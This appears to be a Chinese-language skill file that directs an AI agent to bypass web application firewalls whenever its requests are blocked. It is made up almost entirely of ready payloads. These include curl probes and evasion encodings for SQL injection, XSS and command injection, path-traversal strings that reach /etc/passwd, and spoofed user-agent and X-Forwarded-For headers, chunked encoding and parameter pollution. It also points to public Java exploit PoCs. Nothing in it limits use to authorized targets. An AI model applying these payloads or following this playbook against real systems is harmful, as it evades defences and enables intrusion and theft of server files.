---
name: waf-bypass
description: WAF绕过完整方案——检测→绕过→验证。Use when 请求被403/拦截/payload被改写/提示WAF。
---

# WAF 绕过

> 蒸馏自CC挖洞武器库 waf-bypass-完整手册 + ghost-bits（2026实战验证）

## 检测（先摸清规则）

```bash
# 基线对比
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://T/?"                    # 正常
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://T/?id=1' or 1=1-- -"    # 被拦?
# 单关键词逐个测：union/select/<script>/php:///etc/passwd 哪个触发拦截
# 位置测：URL参数/Header/Cookie/Body 哪个被查
# 类型测：GET vs POST、json vs form
```

## 分层绕过（按被拦内容）

### SQL注入绕过
```
空格 → /**/、%0a、%09
union select → u/**/nion s/**/elect、UNION%0aSELECT、大小写
or → ||、%6f%72、o%72
-- → #、--+、;%00
substr→substring/mid、sleep→benchmark、=→like
```

### XSS绕过
```
<script> → <img onerror> <svg/onload> <details ontoggle> <iframe srcdoc>
引号过滤 → onerror=alert`1`（无引号）
关键词 → <ScRiPt>、&#x3c;、\x3c
短payload(32字符限制) → <svg onload=alert(1)>（冷门事件）
```

### 命令注入绕过
```
空格 → ${IFS}、%09、$IFS$9
cat → c""at、c\at、tac
;&&| → %3B、%26%26、|
```

### 路径绕过
```
../ → ....//、%2e%2e%2f、%252e（双编码）、..;/
/etc/passwd → /etc//passwd、/etc/./passwd
```

## 传输层规避

```bash
# UA伪装（WAF常拦工具UA）
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
# X-Forwarded-For: 127.0.0.1（部分WAF信任内网）
# 分块传输 Transfer-Encoding: chunked（绕body检测）
# 参数污染 id=1&id=2、大小写方法 GeT
# 参数位置换：URL→Body→Cookie→Header
```

## Ghost Bits（Java目标被拦时）

2026-04 Black Hat Asia官方披露（Cast Attack）：BCEL/Jackson/Tomcat/Spring等14组件受影响。
- 特征：Java类加载相关的WAF拦截
- 思路：查找组件版本→匹配受影响列表→利用公开PoC
- 详见 ghost-bits-完整手册（武器库）

## 判定

- 绕过成功：响应不再是被拦特征（403→200/空→内容）
- 每条只试一次（节约时间），3种技术失败→换攻击面
